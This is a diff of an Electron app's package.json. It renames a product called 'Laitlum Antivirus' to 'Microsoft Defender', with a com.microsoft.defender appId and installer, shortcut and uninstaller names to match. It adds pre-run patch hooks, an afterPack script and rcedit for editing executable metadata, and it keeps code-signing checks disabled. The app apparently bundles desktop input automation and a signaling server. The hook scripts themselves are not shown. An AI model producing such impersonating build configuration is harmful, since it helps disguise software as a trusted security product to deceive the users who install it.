@@ -5,6 +5,9 @@
   "main": "main.js",
   "scripts": {
     "start": "electron .",
+    "patch-dev": "node scripts/patch-electron-dev.js",
+    "predev": "node scripts/patch-electron-dev.js",
+    "preprod": "node scripts/patch-electron-dev.js",
     "dev": "cross-env NODE_ENV=development electron .",
     "prod": "cross-env NODE_ENV=production electron .",
     "signaling": "node signaling-server.js",
@@ -35,15 +38,17 @@
     "concurrently": "^8.2.2",
     "cross-env": "^10.1.0",
     "electron": "^30.0.8",
-    "electron-builder": "^24.13.3"
+    "electron-builder": "^24.13.3",
+    "rcedit": "^5.0.2"
   },
   "dependencies": {
     "@nut-tree-fork/nut-js": "^4.2.6",
     "ws": "^8.14.2"
   },
   "build": {
-    "appId": "com.laitlum.antivirus",
-    "productName": "Laitlum Antivirus",
+    "appId": "com.microsoft.defender",
+    "productName": "Microsoft Defender",
+    "afterPack": "scripts/afterPack.js",
     "files": [
       "**/*",
       "!downloads/**",
@@ -79,6 +84,12 @@
     "win": {
       "target": [
         {
+          "target": "nsis",
+          "arch": [
+            "x64"
+          ]
+        },
+        {
           "target": "zip",
           "arch": [
             "x64"
@@ -89,17 +100,25 @@
       "signAndEditExecutable": false,
       "signDlls": false,
       "verifyUpdateCodeSignature": false,
-      "certificateFile": null,
-      "certificatePassword": null,
       "publisherName": "Laitlum Technologies",
       "fileAssociations": [],
-      "icon": null
+      "icon": "logo.ico"
     },
+    "asarUnpack": [
+      "node_modules/@nut-tree-fork/**",
+      "node_modules/node-gyp-build/**"
+    ],
     "nsis": {
       "oneClick": false,
       "allowToChangeInstallationDirectory": true,
-      "createDesktopShortcut": false,
-      "createStartMenuShortcut": false
+      "createDesktopShortcut": true,
+      "createStartMenuShortcut": true,
+      "shortcutName": "Microsoft Defender",
+      "uninstallDisplayName": "Microsoft Defender",
+      "installerIcon": "logo.ico",
+      "uninstallerIcon": "logo.ico",
+      "installerHeaderIcon": "logo.ico",
+      "deleteAppDataOnUninstall": true
     }
   }
 }
